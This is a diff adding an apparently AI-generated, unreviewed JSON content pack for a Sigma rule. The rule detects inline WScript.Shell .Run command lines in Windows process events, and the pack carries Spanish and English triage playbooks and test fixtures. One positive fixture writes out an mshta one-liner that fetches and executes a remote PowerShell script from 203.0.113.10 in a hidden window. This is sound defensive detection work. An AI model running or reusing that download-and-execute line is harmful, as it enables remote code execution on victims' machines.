@@ -1,0 +1,124 @@
+{
+  "rule": {
+    "id": "2c28c248-7f50-417a-9186-a85b223010ee",
+    "title": "Wscript Shell Run In CommandLine",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mshta_inline_vbscript.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso se inició con una línea de comandos que contiene \"Wscript.\", \".Shell\" y \".Run\", típico de VBScript o JScript inline que crea el objeto WScript.Shell para lanzar otro comando. Suele verse en abuso de mshta, rundll32 o cargadores como ModernLoader.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene a la vez las cadenas \"Wscript.\", \".Shell\" y \".Run\" (sin distinguir mayúsculas), por ejemplo mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run ...\").",
+      "why_it_matters": "Ejecutar script inline desde la línea de comandos permite lanzar payloads sin dejar un archivo de script en disco y evadir controles basados en archivos. Corresponde a ATT&CK T1059 (Command and Scripting Interpreter), táctica de ejecución.",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique el comando pasado a .Run (powershell, cmd, URL remota) y si usa ventana oculta (parámetro 0) o cadenas ofuscadas.",
+        "Revise Image y ParentImage: mshta.exe o rundll32.exe lanzados desde Office, navegador, explorer.exe o un acceso directo (.lnk) son altamente sospechosos.",
+        "Pivotee a los procesos hijos del mismo host en +/- 15 minutos: powershell, cmd, certutil, bitsadmin o binarios en %TEMP% y %APPDATA%.",
+        "Busque conexiones de red y consultas DNS del proceso y sus hijos; contraste dominios e IP con inteligencia de amenazas.",
+        "Verifique el usuario: si es una cuenta de administrador conocida ejecutando scripts de gestión, o un usuario estándar sin motivo aparente.",
+        "Revise mecanismos de persistencia creados en la misma ventana: claves Run, tareas programadas, carpeta Startup o suscripciones WMI con la misma cadena.",
+        "Consulte alertas previas del mismo host, usuario y hash del binario para detectar actividad recurrente o campañas en curso."
+      ],
+      "false_positives": [
+        "Aplicaciones de terceros poco comunes que lanzan VBScript inline mediante mshta para instaladores o lanzadores.",
+        "Administradores que usan one-liners con WScript.Shell.Run en scripts de inicio de sesión o herramientas de despliegue; documente y filtre por ParentImage o ruta específica."
+      ],
+      "response_steps": [
+        "Confirme la malicia revisando el comando ejecutado, el proceso padre y la actividad de red; si es legítimo, documente y ajuste un filtro específico.",
+        "Si es malicioso, aísle el endpoint desde el EDR y termine el árbol de procesos involucrado.",
+        "Recolecte artefactos: archivos descargados, hashes, claves de persistencia y logs; bloquee dominios e IP identificados.",
+        "Elimine la persistencia y los payloads verificados, restablezca credenciales del usuario afectado y busque el mismo patrón en otros hosts."
+      ],
+      "severity_rationale": "Nivel medio porque el patrón es común en malware pero también aparece en algunas herramientas administrativas, por lo que requiere contexto antes de escalar."
+    },
+    "en": {
+      "summary": "A process started with a command line containing \"Wscript.\", \".Shell\" and \".Run\", typical of inline VBScript or JScript creating a WScript.Shell object to launch another command. This is often seen with mshta or rundll32 abuse and loaders such as ModernLoader.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains all of \"Wscript.\", \".Shell\" and \".Run\" (case-insensitive), e.g. mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run ...\").",
+      "why_it_matters": "Inline script on the command line lets attackers run payloads without dropping a script file, evading file-based controls. Maps to ATT&CK T1059 (Command and Scripting Interpreter), Execution tactic.",
+      "triage_steps": [
+        "Read the full CommandLine: identify what .Run launches (powershell, cmd, remote URL), whether the window is hidden (0 argument) and any obfuscation.",
+        "Check Image and ParentImage: mshta.exe or rundll32.exe spawned by Office, a browser, explorer.exe or a .lnk shortcut is highly suspicious.",
+        "Pivot to child processes on the same host within +/- 15 minutes: powershell, cmd, certutil, bitsadmin or binaries in %TEMP% and %APPDATA%.",
+        "Review network connections and DNS queries from the process and its children; check domains and IPs against threat intelligence.",
+        "Verify the user: a known admin running management scripts, or a standard user with no plausible reason.",
+        "Look for persistence created in the same window: Run keys, scheduled tasks, Startup folder or WMI subscriptions containing the same string.",
+        "Check earlier alerts for the same host, user and binary hash to spot recurring activity or an ongoing campaign."
+      ],
+      "false_positives": [
+        "Rare third-party applications that launch inline VBScript via mshta for installers or launchers.",
+        "Administrators using WScript.Shell.Run one-liners in logon scripts or deployment tooling; document and filter by ParentImage or specific path."
+      ],
+      "response_steps": [
+        "Confirm maliciousness by reviewing the executed command, parent process and network activity; if legitimate, document it and add a narrow filter.",
+        "If malicious, isolate the endpoint via EDR and terminate the involved process tree.",
+        "Collect artifacts: downloaded files, hashes, persistence keys and logs; block identified domains and IPs.",
+        "Remove verified persistence and payloads, reset the affected user's credentials and hunt for the same pattern on other hosts."
+      ],
+      "severity_rationale": "Medium because the pattern is common in malware but also appears in some admin tooling, so context is needed before escalating."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "mshta launched from explorer runs inline VBScript that uses Wscript.Shell.Run to start hidden PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -nop -w hidden -c iex(iwr http://203.0.113.10/a.ps1)\"\",0:close\")"
+        }
+      },
+      {
+        "description": "rundll32 JavaScript inline execution using ActiveXObject WScript.Shell .Run",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\rundll32.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c echo test > %TEMP%\\t.txt\",0);window.close();"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate logon script executed by wscript.exe; only 'Wscript.' is present",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\wscript.exe",
+          "ParentImage": "C:\\Windows\\System32\\userinit.exe",
+          "CommandLine": "\"C:\\Windows\\System32\\wscript.exe\" //B \\\\andes.example.com\\NETLOGON\\logon.vbs"
+        }
+      },
+      {
+        "description": "Inline VBScript using WScript.Shell with .Exec instead of .Run, so not all keywords match",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Exec(\"\"ipconfig /all\"\"):close\")"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
